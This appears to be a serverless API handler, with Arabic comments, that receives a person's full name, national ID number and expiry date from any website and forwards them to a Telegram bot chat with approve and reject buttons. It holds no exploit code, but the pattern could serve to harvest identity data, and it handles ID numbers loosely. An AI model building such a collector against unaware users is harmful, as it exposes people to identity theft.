export default async function handler(req, res) {
  // السماح بالاتصال من أي موقع (CORS)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ error: 'Missing environment variables on Vercel' });
  }

  const { user_id, الاسم_الكامل, رقم_الهوية, تاريخ_الانتهاء } = req.body || {};

  // نص الرسالة التي ستصلك على بوت تلجرام مع أزرار الموافقة والرفض
  const message = `🚨 *طلب تحقق جديد من الهوية*:\n\n` +
                  `👤 *الاسم*: ${الاسم_الكامل || 'غير متوفر'}\n` +
                  `🆔 *رقم الهوية*: \`${رقم_الهوية || 'غير متوفر'}\`\n` +
                  `📅 *تاريخ الانتهاء*: ${تاريخ_الانتهاء || 'غير متوفر'}\n` +
                  `🔑 *User ID*: \`${user_id || 'N/A'}\``;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${user_id}` },
        { text: "❌ رفض", callback_data: `reject_${user_id}` }
      ]
    ]
  };

  try {
    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });

    const data = await telegramResponse.json();

    if (!data.ok) {
      return res.status(400).json({ success: false, error: data.description });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
}
